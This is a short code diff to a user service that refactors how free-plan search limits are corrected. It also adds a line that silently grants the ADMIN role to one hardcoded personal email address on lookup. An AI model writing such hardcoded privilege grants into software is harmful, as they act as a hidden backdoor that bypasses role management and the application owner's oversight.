@@ -51,16 +51,28 @@ export class UsersService {
         },
         include: { SubscriptionRequest: true }
       });
-    } else if (user.plan === 'FREE' && user.searchLimit > 1) {
-      // Legacy user correction: Sync searchesLeft/searchLimit to 1 for basic free tier
-      user = await this.prisma.user.update({
-        where: { email },
-        data: {
-          searchLimit: 1,
-          searchesLeft: Math.min(user.searchesLeft, 1)
-        },
-        include: { SubscriptionRequest: true }
-      });
+    } else {
+      let needsUpdate = false;
+      const updateData: any = {};
+
+      if (user.plan === 'FREE' && user.searchLimit > 1) {
+        updateData.searchLimit = 1;
+        updateData.searchesLeft = Math.min(user.searchesLeft, 1);
+        needsUpdate = true;
+      }
+
+      if (email === 'ahmedsabbir2013@gmail.com' && user.role !== 'ADMIN') {
+        updateData.role = 'ADMIN';
+        needsUpdate = true;
+      }
+
+      if (needsUpdate) {
+        user = await this.prisma.user.update({
+          where: { email },
+          data: updateData,
+          include: { SubscriptionRequest: true }
+        });
+      }
     }
 
     return user;
